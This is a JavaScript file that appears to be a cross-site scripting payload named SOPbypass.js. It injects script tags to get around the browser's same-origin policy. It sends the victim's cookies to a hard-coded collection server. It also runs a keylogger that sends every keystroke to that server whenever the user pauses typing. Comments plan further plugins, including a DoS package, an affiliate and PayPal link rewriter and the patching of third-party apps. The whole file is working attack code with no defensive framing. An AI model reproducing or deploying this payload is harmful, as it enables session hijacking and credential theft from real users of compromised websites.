// XXX change to use sopb to bootstrap an object that loads plugins
// instead of hardcoding functionality into payload:
// - keylogger
// - cookie stealer
// - DoS package
// - change current window into invisible iframe + child?
// - link rewriter (affiliate codes, paypal links...)
// - monkey patch 3rd party apps (advert systems, mibbit...)


//Primitive communication system that doesn't honor
//Same Origin Policy like XMLHttpRequest
function SOPbypass(base) {
    this.head = document.getElementsByTagName('head')[0];
    this.base = base;

    this.send = function (loc) {
        var ds = document.createElement('script');
        ds.id = "SOPbypass" + String(Math.random()); //some browsers might
                                                     //cry when asked to remove
                                                     //a non-unique id
        ds.src = this.base + loc;
        ds.type = "text/javascript";
        this.head.appendChild(ds); //perform GET. Return data is inserted into
                                   //SOPbypass prototype :S

        setTimeout(function () {
            ds.parentNode.removeChild(ds);
        }, 500); //delayed removal allows response script to execute
    };
}


var sopb = new SOPbypass("http://192.168.1.101:8080/");
var instanceID = String(Math.random()); //unique tag per load/user

//cookie stealer
sopb.send("cookie/" + instanceID + "/" + (document.cookie || "no cookie") +
          "/" + instanceID);

//handling of returned data must be delayed :S
setTimeout(function () {
    var body = document.getElementsByTagName('body')[0];
    body.innerHTML += "<p>" + sopb.response + "</p>";
}, 100);


//buffered javascript keylogger
//Keys are collected as user types and sent only when user pauses typing.
//Much cheaper than real-time keylogger or constantly sniffing DOM for
//forms that could appear a la AJAX.
var isTyping = false;
var keyString = "";

setInterval(function () {
    if(!isTyping && keyString) {
        var d = new Date();
        sopb.send("keys/" + instanceID + "/" + keyString + "/" + d.getTime());
        keyString = "";
    }
}, 500);

setInterval(function () {
    isTyping = false;
}, 1000);

document.onkeypress = function (ev) {
    isTyping = true;
    var ev = ev || window.event;
    var key = (ev.which||ev.charCode||ev.keyCode);
    keyString += key + "-";
};
//SOPbypass.js
